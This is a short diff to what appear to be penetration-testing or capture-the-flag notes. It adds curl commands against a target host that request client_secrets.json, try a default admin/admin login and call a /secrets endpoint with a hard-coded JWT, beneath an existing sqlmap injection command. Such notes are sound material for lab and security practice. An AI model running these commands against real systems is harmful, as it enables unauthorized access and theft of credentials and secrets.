@@ -21,3 +21,8 @@ sqlmap "ip" --cookie="PHPSESSID=coookie" --random-agent --forms --columns
 
 for auth
 https://github.com/maurosoria/dirsearch/blob/master/db/dicc.txt
+1.curl -X POST http://$ip/auth  
+2.curl http://$ip/client_secrets.json 
+3.curl -X POST http://$ip/auth -d '{ "username": "admin", "password": "admin" }' -H 'Content-type: application/json'
+4.curl  http://$ip/secrets -H 'Authorization: JWT eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3Mzc1NzQyMDksImlhdCI6MTczNzU3MzkwOSwibmJmIjoxNzM3NTczOTA5LCJpZGVudGl0eSI6MX0.MOeH-8WbE291bB3bOl1txHplkYlArLDGnI2i0RVDRag' -v
+
